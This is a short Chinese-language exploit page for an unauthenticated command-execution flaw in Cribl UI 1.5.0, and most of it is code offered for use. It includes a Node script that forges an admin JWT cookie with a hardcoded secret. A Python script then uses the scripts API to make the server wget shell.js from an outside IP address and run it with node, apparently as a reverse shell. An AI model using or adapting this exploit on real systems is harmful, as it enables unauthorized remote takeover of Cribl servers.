##### 标题：Cribl UI 1.5.0 未授权命令执行漏洞
##### 应用名称：Cribl
##### 漏洞类型：命令执行
##### 详情/使用方法：
1.获取cookie
```node
var jwt = require('jwt-simple');
var payload = {
  "username": "admin",
  "exp": 9999999999
};
var secret = 'd2hvIGxldCB0aGUgZG9ncyBvdXQ=';

// encode
var token = jwt.encode(payload, secret);
console.log(token);

// decode
var decoded = jwt.decode(token, secret);
console.log(decoded);

```

```bash
node cookie.js

```
```node
cookie伪造脚本：https://github.com/hokaccha/node-jwt-simple 
```
python3 criblshell.py

#### exp
```python
import requests
import os


p = os.popen('node /root/cookie_create.js')
x = p.read()
cookie = x.split('\n')[0]
## 写入ip
#
ip_addr = ""
# 伪造cookie
# cribl_auth= "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY"
#伪造请求头
cookies = {
    'cribl_auth': cookie,
}

headers = {
    'Content-Type': 'application/json',
}

# first  写入wget

url_1="http://"+ip_addr+":9000"+"/api/v1/system/scripts"
# 写入shell脚本地址
data1 = '{"id":"runme","command":"/usr/bin/wget","args":["http://49.234.221.56/shell.js","-P","/opt"],"env":{}}'
response1 = requests.post(url_1,headers=headers, cookies=cookies, data=data1)
result1 = response1.text;
print("命令1写入结果："+result1)

#second  run wget
url_2="http://"+ip_addr+":9000/api/v1/system/scripts/runme/run"
data2 = '{}'
response2 = requests.post(url_2, headers=headers, cookies=cookies, data=data2)
result2= response2.text
print("命令1执行结果:"+result2)


#third  写入执行shell命令
url_3="http://"+ip_addr+":9000/api/v1/system/scripts"
data3 = '{"id":"reverseit","command":"node","args":["/opt/shell.js"],"env":{}}'
response3 = requests.post(url_3, headers=headers, cookies=cookies, data=data3)
result3= response3.text
print("命令2写入结果:"+result3)


#forth run shell
url_4="http://"+ip_addr+":9000/api/v1/system/scripts/reverseit/run"
data4 = '{}'
response4 = requests.post(url_4, headers=headers, cookies=cookies, data=data4)

result4= response4.text
print("命令2执行结果:"+result4)



```